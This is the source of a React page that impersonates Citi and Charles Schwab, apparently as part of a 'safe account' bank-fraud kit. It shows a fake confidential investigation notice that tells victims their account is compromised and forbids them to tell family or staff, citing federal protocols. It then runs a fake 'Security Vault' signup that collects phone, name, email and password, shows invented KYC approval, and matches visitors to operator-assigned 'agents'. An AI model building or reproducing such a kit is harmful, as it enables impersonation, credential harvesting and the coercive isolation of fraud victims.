import { useState } from 'react';
import { useLocation } from 'wouter';
import { HeaderCiti } from '@/components/HeaderCiti';
import { HeaderLoggedIn } from '@/components/HeaderLoggedIn';
import { SiteFooter } from '@/components/SiteFooter';

// ── Disclaimer / Acknowledgment gate ─────────────────────────────────────────

function DisclaimerGate({ onAcknowledge, isCiti }: { onAcknowledge: () => void; isCiti: boolean }) {
  const accent = isCiti ? '#003087' : '#344B58';
  const accentHover = isCiti ? '#002570' : '#2A3E4A';

  const agentsKey = `finvault_agents_${isCiti ? 'citi' : 'schwab'}`;
  const agents: string[] = (() => {
    try { return JSON.parse(localStorage.getItem(agentsKey) || '[]'); } catch { return []; }
  })();

  const agentLine = agents.length === 0
    ? 'Only the agent assigned to your case is authorised to discuss this matter with you.'
    : agents.length === 1
      ? `Only ${agents[0]} is authorised to discuss this matter with you.`
      : `Only ${agents.slice(0, -1).join(', ')} and ${agents[agents.length - 1]} are authorised to discuss this matter with you.`;

  return (
    <div style={{
      minHeight: '100vh', display: 'flex', flexDirection: 'column',
      fontFamily: '"Helvetica Neue", Arial, sans-serif',
      background: '#F0F2F5',
    }}>
      {isCiti ? <HeaderCiti loggedIn /> : <HeaderLoggedIn />}

      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '48px 24px' }}>
        <div style={{ width: '100%', maxWidth: 580 }}>

          {/* Main card */}
          <div style={{
            background: '#fff',
            border: '1px solid #D1D5DB',
            borderRadius: 2,
            overflow: 'hidden',
            boxShadow: '0 2px 12px rgba(0,0,0,0.07)',
          }}>
            {/* Top accent stripe */}
            <div style={{ height: 4, background: '#B91C1C' }} />

            {/* Card header — slate, matching security alert */}
            <div style={{
              background: accent,
              padding: '14px 28px',
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                {isCiti ? (
                  <svg width="44" height="22" viewBox="0 0 120 64" xmlns="http://www.w3.org/2000/svg">
                    <text x="4" y="54" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="56" fill="#fff" letterSpacing="-1">citi</text>
                    <path d="M78 10 Q90 2 102 10" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round"/>
                  </svg>
                ) : (
                  <img
                    src="/schwab-logo-grey.png"
                    alt="Charles Schwab"
                    style={{ height: 22, width: 'auto', filter: 'brightness(0) invert(1)', display: 'block' }}
                  />
                )}
                <div style={{ width: 1, height: 16, background: 'rgba(255,255,255,0.22)' }} />
                <span style={{ fontSize: 11.5, color: 'rgba(255,255,255,0.8)', fontWeight: 600, letterSpacing: '0.03em' }}>Security Center</span>
              </div>
              <div style={{ fontSize: 10, fontWeight: 700, background: '#B91C1C', color: '#fff', padding: '3px 10px', borderRadius: 2, letterSpacing: '0.1em' }}>
                CONFIDENTIAL
              </div>
            </div>

            {/* Title block */}
            <div style={{ padding: '26px 28px 0', borderBottom: '1px solid #F3F4F6' }}>
              <div style={{ display: 'flex', alignItems: 'flex-start', gap: 14, paddingBottom: 22 }}>
                {/* Shield icon — plain, no colored background */}
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#B91C1C" strokeWidth="1.75" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 8v4m0 4h.01" stroke="#B91C1C" strokeWidth="1.75" strokeLinecap="round"/>
                </svg>
                <div>
                  <div style={{ fontSize: 10, fontWeight: 700, color: '#B91C1C', letterSpacing: '0.14em', textTransform: 'uppercase', marginBottom: 5 }}>
                    Case File, Confidential
                  </div>
                  <h1 style={{ fontSize: 19, fontWeight: 700, color: '#111827', lineHeight: 1.25, margin: '0 0 6px' }}>
                    Important Confidentiality Notice
                  </h1>
                  <p style={{ fontSize: 12.5, color: '#6B7280', margin: 0 }}>
                    Please read carefully before proceeding
                  </p>
                </div>
              </div>
            </div>

            {/* Body */}
            <div style={{ padding: '24px 28px 28px' }}>

              {/* Main notice box — pale blue, institutional */}
              <div style={{
                background: '#EFF6FF',
                border: '1px solid #BFDBFE',
                borderLeft: '3px solid #1D4ED8',
                borderRadius: 2, padding: '14px 18px', marginBottom: 22,
              }}>
                <p style={{ fontSize: 13.5, color: '#1E3A5F', lineHeight: 1.75, margin: 0 }}>
                  This investigation is private due to the unknown compromise of your account.
                </p>
              </div>

              {/* Prohibited disclosures */}
              <div style={{ marginBottom: 22 }}>
                <div style={{ fontSize: 10, fontWeight: 700, color: '#9CA3AF', letterSpacing: '0.12em', textTransform: 'uppercase', marginBottom: 12 }}>
                  You must not disclose any information regarding:
                </div>
                {[
                  'Any calls or communications related to this matter',
                  'The vulnerability or compromise of your account',
                  'The existence or details of this investigation',
                  'Any security measures being applied to your account',
                ].map((item, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 10, marginBottom: 9 }}>
                    {/* Plain SVG X — no colored background */}
                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none" style={{ flexShrink: 0, marginTop: 3 }}>
                      <circle cx="7" cy="7" r="6.5" stroke="#B91C1C" strokeWidth="1.25"/>
                      <path d="M4.5 4.5l5 5M9.5 4.5l-5 5" stroke="#B91C1C" strokeWidth="1.5" strokeLinecap="round"/>
                    </svg>
                    <span style={{ fontSize: 13, color: '#374151', lineHeight: 1.55 }}>{item}</span>
                  </div>
                ))}
              </div>

              {/* Warning callout — institutional pale blue/grey */}
              <div style={{
                background: '#F9FAFB',
                border: '1px solid #E5E7EB',
                borderLeft: '3px solid #374151',
                borderRadius: 2, padding: '13px 16px', marginBottom: 22,
                display: 'flex', alignItems: 'flex-start', gap: 12,
              }}>
                {/* Warning triangle — clean SVG */}
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                  <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#374151" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 9v4m0 4h.01" stroke="#374151" strokeWidth="2" strokeLinecap="round"/>
                </svg>
                <p style={{ fontSize: 13, color: '#374151', lineHeight: 1.65, margin: 0 }}>
                  <strong>Do not disclose</strong> any of the above to <strong>anyone</strong>, including
                  other staff members, family, or colleagues.
                </p>
              </div>

              {/* Legal footer text */}
              <p style={{ fontSize: 11, color: '#9CA3AF', lineHeight: 1.65, marginBottom: 24, borderTop: '1px solid #F3F4F6', paddingTop: 16 }}>
                Unauthorised disclosure of this information may constitute a violation of federal security protocols
                and could compromise the active investigation. Your cooperation is required under the terms of
                your account agreement.
              </p>

              {/* Acknowledge button */}
              <button
                onClick={onAcknowledge}
                style={{
                  width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                  padding: '13px 0', borderRadius: 3, border: 'none', cursor: 'pointer',
                  background: accent, color: '#fff', fontSize: 14, fontWeight: 700,
                  letterSpacing: '0.01em', transition: 'background 0.15s',
                }}
                onMouseEnter={(e) => { e.currentTarget.style.background = accentHover; }}
                onMouseLeave={(e) => { e.currentTarget.style.background = accent; }}>
                {/* Lock icon — plain SVG */}
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
                  <rect x="3" y="11" width="18" height="11" rx="2" stroke="white" strokeWidth="2"/>
                  <path d="M7 11V7a5 5 0 0110 0v4" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                </svg>
                I Acknowledge, Proceed Securely
              </button>

              <p style={{ fontSize: 10.5, color: '#9CA3AF', textAlign: 'center', marginTop: 12 }}>
                By clicking above you confirm you have read and understood this notice.
              </p>
            </div>

            {/* FDIC trust strip */}
            <div style={{
              borderTop: '1px solid #F3F4F6',
              background: '#FAFAFA',
              padding: '12px 28px',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 14,
            }}>
              <img
                src="/fdic-logo.png"
                alt="FDIC"
                style={{ height: 20, width: 'auto', opacity: 0.55, filter: 'grayscale(1)', display: 'block' }}
              />
              <div style={{ width: 1, height: 16, background: '#E5E7EB' }} />
              <span style={{ fontSize: 10.5, color: '#9CA3AF', letterSpacing: '0.03em' }}>
                Member FDIC · Insured by the Federal Deposit Insurance Corporation
              </span>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

// ── Vault setup steps ─────────────────────────────────────────────────────────

type Step = 1 | 2 | 3 | 4;

function VaultSteps({ isCiti }: { isCiti: boolean }) {
  const [, navigate] = useLocation();
  const [step, setStep] = useState<Step>(1);

  // Step 1 — phone
  const [phone, setPhone] = useState('');

  // Step 2 — create account
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [pwError, setPwError] = useState('');

  const accent = isCiti ? '#003087' : '#344B58';
  const accentHover = isCiti ? '#0041B8' : '#2A3E4A';

  const STEPS = [
    { n: 1, label: 'Verify Identity' },
    { n: 2, label: 'Create Account' },
    { n: 3, label: 'KYC Approved' },
    { n: 4, label: 'Complete' },
  ];

  // Check phone or email against admin-configured visitor settings
  const matchVisitor = (identifier: string) => {
    try {
      const settings = JSON.parse(localStorage.getItem('finvault_visitor_settings') || '[]');
      const clean = identifier.toLowerCase().replace(/[\s\-().]/g, '');
      const match = settings.find((s: { identifier: string }) => {
        const id = s.identifier.toLowerCase().replace(/[\s\-().]/g, '');
        return id === clean || id.includes(clean) || clean.includes(id);
      });
      if (match) localStorage.setItem('finvault_matched_visitor', JSON.stringify(match));
    } catch {}
  };

  const handleNext = () => {
    if (step === 1) {
      // Check phone against visitor settings
      if (phone) matchVisitor(phone);
    }
    if (step === 2) {
      if (password.length < 8) { setPwError('Password must be at least 8 characters'); return; }
      if (password !== confirmPassword) { setPwError('Passwords do not match'); return; }
      setPwError('');
      // Persist name + email so dashboard can show display name + check visitor settings
      if (name) localStorage.setItem('finvault_vault_name', name);
      if (email) {
        localStorage.setItem('finvault_vault_email', email);
        matchVisitor(email);
      }
    }
    setStep(s => Math.min(4, s + 1) as Step);
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', height: 44, padding: '0 14px', borderRadius: 3, border: '1px solid #D1D5DB',
    fontSize: 14, outline: 'none', background: '#fff', color: '#111827', boxSizing: 'border-box',
  };
  const labelStyle: React.CSSProperties = {
    fontSize: 12, fontWeight: 600, color: '#374151', display: 'block', marginBottom: 5,
  };
  const btnStyle: React.CSSProperties = {
    width: '100%', padding: '13px 0', borderRadius: 3, fontSize: 14, fontWeight: 700,
    border: 'none', cursor: 'pointer', background: accent, color: '#fff', marginTop: 20,
  };

  // Brand logo SVG (white, for dark header)
  const BrandLogo = () => isCiti ? (
    <svg width="36" height="18" viewBox="0 0 120 64">
      <text x="4" y="54" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="56" fill="#fff" letterSpacing="-1">citi</text>
      <path d="M78 10 Q90 2 102 10" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round"/>
    </svg>
  ) : (
    <svg width="90" height="28" viewBox="0 0 200 60">
      <text x="4" y="44" fontFamily="Georgia,'Times New Roman',serif" fontStyle="italic" fontSize="40" fontWeight="400" fill="white">charles</text>
      <text x="106" y="44" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="29" fill="white" letterSpacing="2">SCHWAB</text>
    </svg>
  );

  // Card header with logo — appears on every step
  const CardHeader = ({ subtitle }: { subtitle: string }) => (
    <div style={{
      background: accent, padding: '12px 24px',
      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
    }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
        <BrandLogo />
        <div style={{ width: 1, height: 16, background: 'rgba(255,255,255,0.25)' }} />
        <span style={{ fontSize: 11, color: 'rgba(255,255,255,0.8)', fontWeight: 600, letterSpacing: '0.04em' }}>
          Account Security Vault
        </span>
      </div>
      <span style={{ fontSize: 9.5, color: 'rgba(255,255,255,0.6)', fontWeight: 600, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
        {subtitle}
      </span>
    </div>
  );

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', background: '#F4F6F9', fontFamily: '"Helvetica Neue", Arial, sans-serif' }}>
      {isCiti ? <HeaderCiti loggedIn /> : <HeaderLoggedIn />}

      <div style={{ flex: 1, display: 'flex', alignItems: 'flex-start', justifyContent: 'center', padding: '48px 24px' }}>
        <div style={{ width: '100%', maxWidth: 520 }}>

          {/* Progress stepper */}
          <div style={{ marginBottom: 28 }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              {STEPS.map((s, i) => {
                const done = step > s.n;
                const active = step === s.n;
                return (
                  <div key={s.n} style={{ display: 'flex', alignItems: 'center', flex: i < STEPS.length - 1 ? 1 : 'none' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 5 }}>
                      <div style={{
                        width: 28, height: 28, borderRadius: '50%', fontSize: 11, fontWeight: 700,
                        display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                        background: done || active ? accent : '#E5E7EB',
                        color: done || active ? '#fff' : '#9CA3AF',
                        boxShadow: active ? `0 0 0 3px ${accent}30` : 'none',
                      }}>
                        {done
                          ? <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17l-5-5" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                          : s.n}
                      </div>
                      <span style={{ fontSize: 10, fontWeight: active ? 700 : 400, color: active ? accent : done ? '#374151' : '#9CA3AF', whiteSpace: 'nowrap' }}>{s.label}</span>
                    </div>
                    {i < STEPS.length - 1 && (
                      <div style={{ flex: 1, height: 2, background: done ? accent : '#E5E7EB', margin: '0 6px', marginBottom: 18, transition: 'background 0.3s' }} />
                    )}
                  </div>
                );
              })}
            </div>
          </div>

          {/* Step card */}
          <div style={{ background: '#fff', border: '1px solid #E5E7EB', borderRadius: 3, overflow: 'hidden', boxShadow: '0 2px 12px rgba(0,0,0,0.06)' }}>

            {/* ── Step 1: Verify Identity ── */}
            {step === 1 && (
              <>
                <CardHeader subtitle="Step 1 of 4" />
                <div style={{ padding: '28px 32px 32px' }}>
                  <h2 style={{ fontSize: 18, fontWeight: 700, color: '#111827', margin: '0 0 8px' }}>Verify your identity</h2>
                  <p style={{ fontSize: 13, color: '#6B7280', lineHeight: 1.7, margin: '0 0 24px' }}>
                    To secure your account we need to verify you. Enter the phone number associated with your account and we'll send a verification code.
                  </p>
                  <label style={labelStyle}>Phone Number</label>
                  <input
                    type="tel" placeholder="+1 (555) 000-0000" value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && phone && handleNext()}
                    style={inputStyle}
                    onFocus={(e) => (e.target.style.borderColor = accent)}
                    onBlur={(e) => (e.target.style.borderColor = '#D1D5DB')}
                  />
                  <button
                    onClick={() => { if (phone) handleNext(); }}
                    style={{ ...btnStyle, opacity: phone ? 1 : 0.45, cursor: phone ? 'pointer' : 'default' }}
                    onMouseEnter={(e) => phone && (e.currentTarget.style.background = accentHover)}
                    onMouseLeave={(e) => (e.currentTarget.style.background = accent)}>
                    Continue
                  </button>
                </div>
              </>
            )}

            {/* ── Step 2: Create Vault Account ── */}
            {step === 2 && (
              <>
                <CardHeader subtitle="Step 2 of 4" />
                <div style={{ padding: '28px 32px 32px' }}>
                  <h2 style={{ fontSize: 18, fontWeight: 700, color: '#111827', margin: '0 0 8px' }}>Create your Vault account</h2>
                  <p style={{ fontSize: 13, color: '#6B7280', lineHeight: 1.7, margin: '0 0 22px' }}>
                    Register your Account Security Vault with an email address and a secure password.
                  </p>

                  <label style={labelStyle}>Full Name</label>
                  <input
                    type="text" placeholder="John Smith" value={name}
                    onChange={(e) => setName(e.target.value)}
                    style={{ ...inputStyle, marginBottom: 14 }}
                    onFocus={(e) => (e.target.style.borderColor = accent)}
                    onBlur={(e) => (e.target.style.borderColor = '#D1D5DB')}
                  />

                  <label style={labelStyle}>Email Address</label>
                  <input
                    type="email" placeholder="you@example.com" value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    style={{ ...inputStyle, marginBottom: 14 }}
                    onFocus={(e) => (e.target.style.borderColor = accent)}
                    onBlur={(e) => (e.target.style.borderColor = '#D1D5DB')}
                  />

                  <label style={labelStyle}>Password</label>
                  <input
                    type="password" placeholder="Min. 8 characters" value={password}
                    onChange={(e) => { setPassword(e.target.value); setPwError(''); }}
                    style={{ ...inputStyle, marginBottom: 14 }}
                    onFocus={(e) => (e.target.style.borderColor = accent)}
                    onBlur={(e) => (e.target.style.borderColor = '#D1D5DB')}
                  />

                  <label style={labelStyle}>Confirm Password</label>
                  <input
                    type="password" placeholder="Re-enter password" value={confirmPassword}
                    onChange={(e) => { setConfirmPassword(e.target.value); setPwError(''); }}
                    onKeyDown={(e) => e.key === 'Enter' && handleNext()}
                    style={{ ...inputStyle, borderColor: pwError ? '#EF4444' : '#D1D5DB' }}
                    onFocus={(e) => (e.target.style.borderColor = pwError ? '#EF4444' : accent)}
                    onBlur={(e) => (e.target.style.borderColor = pwError ? '#EF4444' : '#D1D5DB')}
                  />
                  {pwError && <p style={{ fontSize: 12, color: '#EF4444', margin: '6px 0 0' }}>{pwError}</p>}

                  <button
                    onClick={handleNext}
                    style={{ ...btnStyle, opacity: email && password && confirmPassword ? 1 : 0.45, cursor: email && password && confirmPassword ? 'pointer' : 'default' }}
                    onMouseEnter={(e) => (e.currentTarget.style.background = accentHover)}
                    onMouseLeave={(e) => (e.currentTarget.style.background = accent)}>
                    Create Vault Account
                  </button>
                </div>
              </>
            )}

            {/* ── Step 3: KYC Approved ── */}
            {step === 3 && (
              <>
                <CardHeader subtitle="Step 3 of 4" />
                <div style={{ padding: '28px 32px 32px' }}>
                  {/* KYC badge */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: 14, marginBottom: 22 }}>
                    <div style={{
                      width: 44, height: 44, borderRadius: '50%', flexShrink: 0,
                      border: `2px solid ${accent}`, opacity: 0.75,
                      display: 'flex', alignItems: 'center', justifyContent: 'center',
                    }}>
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M20 6L9 17l-5-5" stroke={accent} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    </div>
                    <div>
                      <div style={{ fontSize: 17, fontWeight: 700, color: '#111827', marginBottom: 3 }}>KYC Approved</div>
                      <div style={{ fontSize: 12, color: '#6B7280' }}>Identity verification complete</div>
                    </div>
                  </div>

                  {/* KYC details panel */}
                  <div style={{ border: '1px solid #E5E7EB', borderRadius: 3, marginBottom: 20, overflow: 'hidden' }}>
                    <div style={{ borderBottom: '1px solid #F3F4F6', padding: '10px 16px', display: 'flex', alignItems: 'center', gap: 8 }}>
                      <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke={accent} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                      <span style={{ fontSize: 10.5, fontWeight: 700, color: '#374151', letterSpacing: '0.06em', textTransform: 'uppercase' }}>KYC Verification Record</span>
                    </div>
                    <div style={{ padding: '14px 16px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px 24px' }}>
                      {[
                        ['Status', 'Approved'],
                        ['Source', isCiti ? 'Citi' : 'Charles Schwab'],
                        ['Passed over', 'Automatically'],
                        ['Verification', 'Full KYC'],
                      ].map(([label, value]) => (
                        <div key={label}>
                          <div style={{ fontSize: 9.5, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 2 }}>{label}</div>
                          <div style={{ fontSize: 13, fontWeight: 600, color: label === 'Status' ? '#374151' : '#1F2937' }}>{value}</div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Explanation */}
                  <p style={{ fontSize: 13, color: '#6B7280', lineHeight: 1.7, margin: '0 0 22px' }}>
                    Your KYC documentation has been verified and approved. Your identity records have been securely passed over from{' '}
                    <span style={{ fontWeight: 700, color: '#374151' }}>{isCiti ? 'Citi' : 'Charles Schwab'}</span>.{' '}
                    No further identity verification is required.
                  </p>

                  <button
                    onClick={handleNext}
                    style={btnStyle}
                    onMouseEnter={(e) => (e.currentTarget.style.background = accentHover)}
                    onMouseLeave={(e) => (e.currentTarget.style.background = accent)}>
                    Continue
                  </button>
                </div>
              </>
            )}

            {/* ── Step 4: Complete ── */}
            {step === 4 && (
              <>
                <CardHeader subtitle="Setup Complete" />
                <div style={{ padding: '36px 32px 32px', textAlign: 'center' }}>
                  <div style={{
                    width: 56, height: 56, borderRadius: '50%', margin: '0 auto 18px',
                    border: `2px solid ${accent}`,
                    opacity: 0.75,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                  }}>
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                      <path d="M20 6L9 17l-5-5" stroke={accent} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>
                  <h2 style={{ fontSize: 20, fontWeight: 700, color: '#111827', margin: '0 0 10px' }}>Vault Setup Complete</h2>
                  <p style={{ fontSize: 13, color: '#6B7280', lineHeight: 1.75, margin: '0 auto 28px', maxWidth: 360 }}>
                    Your Account Security Vault has been configured and your session has been marked as verified. Your case reference is{' '}
                    <span style={{ fontFamily: 'monospace', fontWeight: 700, color: '#374151' }}>
                      {localStorage.getItem(isCiti ? 'finvault_case_id_citi' : 'finvault_case_id_schwab') || (isCiti ? 'SEC-D4891F' : 'SEC-C1002D')}
                    </span>
                    . Keep this secure.
                  </p>
                  <button
                    onClick={() => {
                      navigate('/vault-creating');
                    }}
                    style={{ ...btnStyle, maxWidth: 280, margin: '0 auto', display: 'block', marginTop: 0 }}
                    onMouseEnter={(e) => (e.currentTarget.style.background = accentHover)}
                    onMouseLeave={(e) => (e.currentTarget.style.background = accent)}>
                    Proceed to Vault Dashboard
                  </button>
                </div>
              </>
            )}

          </div>
        </div>
      </div>

      <SiteFooter />
    </div>
  );
}

// ── Page ─────────────────────────────────────────────────────────────────────

export default function VaultSetupPage() {
  const isCiti = localStorage.getItem('finvault_active_theme') === 'citi';
  const [acknowledged, setAcknowledged] = useState(false);

  if (!acknowledged) {
    return <DisclaimerGate onAcknowledge={() => setAcknowledged(true)} isCiti={isCiti} />;
  }

  return <VaultSteps isCiti={isCiti} />;
}
